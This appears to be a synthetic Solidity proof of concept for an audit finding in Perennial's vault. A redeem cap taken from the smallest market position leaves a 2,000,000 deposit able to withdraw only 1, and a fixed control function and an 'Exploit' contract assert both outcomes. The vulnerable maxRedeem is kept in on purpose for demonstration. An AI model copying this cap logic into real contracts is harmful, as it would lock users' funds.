// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Perennial — maxRedeem is capped by the smallest current market position
    (Sherlock 2023-10 H-3, finding 28950)
    SYNTHETIC, cheatcode-free. The collateral formula is the audited expression.
    A 2_000_000 deposit can redeem 1. The control, which ignores a market whose
    current collateral is still below its target, redeems 1_999_998. */

type UFixed6 is uint256;
type SFixed6 is int256;

function u6(uint256 x) pure returns (UFixed6) {
    return UFixed6.wrap(x);
}

function sub(UFixed6 a, UFixed6 b) pure returns (UFixed6) {
    return u6(UFixed6.unwrap(a) - UFixed6.unwrap(b));
}

function min(UFixed6 a, UFixed6 b) pure returns (UFixed6) {
    return UFixed6.unwrap(a) < UFixed6.unwrap(b) ? a : b;
}

function mul(UFixed6 a, UFixed6 b) pure returns (UFixed6) {
    return u6(UFixed6.unwrap(a) * UFixed6.unwrap(b) / 1e18);
}

function muldiv(UFixed6 a, UFixed6 b, UFixed6 c) pure returns (UFixed6) {
    return u6(UFixed6.unwrap(a) * UFixed6.unwrap(b) / UFixed6.unwrap(c));
}

function abs(SFixed6 a) pure returns (UFixed6) {
    int256 x = SFixed6.unwrap(a);
    return u6(uint256(x < 0 ? -x : x));
}

using {sub, min, mul, muldiv} for UFixed6 global;
using {abs} for SFixed6 global;

library StrategyLib {
    UFixed6 internal constant LEVERAGE_BUFFER = UFixed6.wrap(1e18);
}

struct Position {
    UFixed6 maker;
    UFixed6 netStored;
}

function net(Position memory p) pure returns (UFixed6) {
    return p.netStored;
}

using {net} for Position global;

struct MarketContext {
    Position currentPosition;
    UFixed6 closable;
    SFixed6 latestPrice;
}

struct Registration {
    UFixed6 leverage;
    UFixed6 weight;
}

contract Asset {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vault {
    Asset public token;
    uint256 public totalAssets;
    uint256 public lastCap;
    uint256 public lastPaid;
    uint256 public stepCap;
    uint256 public fairCap;
    uint256 public fairPaid;

    MarketContext[2] internal contexts;
    Registration[2] internal regs;

    constructor(Asset token_) {
        token = token_;
        // Market 1: maker position worth $1 after the weight scale. Target is $1_000_000.
        contexts[0] = MarketContext({
            currentPosition: Position({maker: u6(5e17), netStored: u6(0)}),
            closable: u6(5e17),
            latestPrice: SFixed6.wrap(1e18)
        });
        regs[0] = Registration({leverage: u6(1e18), weight: u6(1e18)});
        // Market 2: position worth $1_000_000, which is its target on a $2_000_000 vault.
        contexts[1] = MarketContext({
            currentPosition: Position({maker: u6(500_000e18), netStored: u6(0)}),
            closable: u6(500_000e18),
            latestPrice: SFixed6.wrap(1e18)
        });
        regs[1] = Registration({leverage: u6(1e18), weight: u6(1e18)});
    }

    function deposit(uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "dep");
        totalAssets += amount;
    }

    function maxRedeem() public returns (uint256) {
        UFixed6 redemptionAssets = u6(totalAssets);
        UFixed6 totalWeight = u6(2e18);
        for (uint256 i = 0; i < 2; i++) {
            MarketContext memory marketContext = contexts[i];
            Registration memory registration = regs[i];
            UFixed6 collateral = marketContext.currentPosition.maker
                .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))
                .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))
                .muldiv(marketContext.latestPrice.abs(), registration.leverage)
                .muldiv(totalWeight, registration.weight);
            // @> VULN: caps redeem by the smallest current position, here $1
            stepCap = UFixed6.unwrap(redemptionAssets.min(collateral));
            redemptionAssets = u6(stepCap);
        }
        return UFixed6.unwrap(redemptionAssets);
    }

    /// Control: a market still below its target does not cap the redeem.
    function maxRedeemFair() public view returns (uint256) {
        UFixed6 totalWeight = u6(2e18);
        uint256 cap = totalAssets;
        for (uint256 i = 0; i < 2; i++) {
            MarketContext memory marketContext = contexts[i];
            Registration memory registration = regs[i];
            UFixed6 totalW = totalWeight;
            UFixed6 collateral = marketContext.currentPosition.maker
                .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))
                .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))
                .muldiv(marketContext.latestPrice.abs(), registration.leverage)
                .muldiv(totalW, registration.weight);
            uint256 current = UFixed6.unwrap(collateral);
            uint256 target = totalAssets * UFixed6.unwrap(registration.weight) / UFixed6.unwrap(totalWeight);
            if (current < target) {
                uint256 room = totalAssets - (current * UFixed6.unwrap(totalWeight) / UFixed6.unwrap(registration.weight));
                if (room < cap) cap = room;
            }
        }
        return cap;
    }

    function redeem(uint256 assets) external returns (uint256 out) {
        lastCap = maxRedeem();
        out = assets > lastCap ? lastCap : assets;
        require(out < assets, "not short");
        totalAssets -= out;
        lastPaid = out;
        require(token.transfer(msg.sender, out), "pay");
    }

    function redeemFair(uint256 assets) external returns (uint256 out) {
        fairCap = maxRedeemFair();
        out = assets > fairCap ? fairCap : assets;
        totalAssets -= out;
        fairPaid = out;
        require(token.transfer(msg.sender, out), "pay");
    }
}

contract Exploit {
    uint256 public constant DEPOSIT = 2_000_000 ether;
    Asset public token;
    Vault public vault;
    uint256 public redeemed;
    uint256 public stuck;
    uint256 public fairRedeemed;

    constructor() {
        token = new Asset();
        vault = new Vault(token);
    }

    function run() external {
        token.mint(address(this), DEPOSIT);
        token.approve(address(vault), DEPOSIT);
        vault.deposit(DEPOSIT);
        redeemed = vault.redeem(DEPOSIT);
        stuck = token.balanceOf(address(vault));
        require(DEPOSIT == 2_000_000 ether, "n");
        require(vault.lastCap() == 1 ether, "cap");
        require(redeemed == 1 ether, "redeemed");
        require(redeemed < DEPOSIT, "less");
        require(stuck == DEPOSIT - 1 ether, "stuck");
    }

    function runControl() external {
        token.mint(address(this), DEPOSIT);
        token.approve(address(vault), DEPOSIT);
        vault.deposit(DEPOSIT);
        fairRedeemed = vault.redeemFair(DEPOSIT);
        require(vault.fairCap() == 1_999_998 ether, "fair cap");
        require(fairRedeemed == 1_999_998 ether, "fair");
        require(fairRedeemed > 1 ether, "beats vuln");
        require(token.balanceOf(address(this)) == 1_999_998 ether, "user");
    }
}
